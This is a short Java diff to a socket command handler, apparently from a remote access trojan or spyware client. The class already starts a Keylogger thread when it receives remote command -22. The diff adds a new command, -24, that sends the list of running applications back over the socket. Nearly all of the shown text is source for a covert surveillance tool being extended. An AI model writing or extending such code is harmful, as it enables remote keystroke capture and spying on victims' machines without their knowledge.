@@ -24,6 +24,7 @@ public class CentralReader implements Runnable {
 	private DataOutputStream dataOutputStream = null;
 	private ReceiveEvents receiveEvents = null;
 	private SendProcess sendProcess = null;
+	private SendAppRunning sendAppRunning = null;
 	
 	public CentralReader(Socket socket) throws IOException {
 		this.setSocket(socket);
@@ -31,6 +32,7 @@ public class CentralReader implements Runnable {
 		this.dataOutputStream = new DataOutputStream(socket.getOutputStream());
 		receiveEvents = new ReceiveEvents(socket);
 		sendProcess = new SendProcess(socket);
+		sendAppRunning = new SendAppRunning(socket);
 	}
 
 	@Override
@@ -113,6 +115,10 @@ public class CentralReader implements Runnable {
 				}
 				case -22: {
 					new Thread(new Keylogger(socket)).start();
+					break;
+				}
+				case -24: {
+					sendAppRunning.sendAppRunning();
 					break;
 				}
 				default:
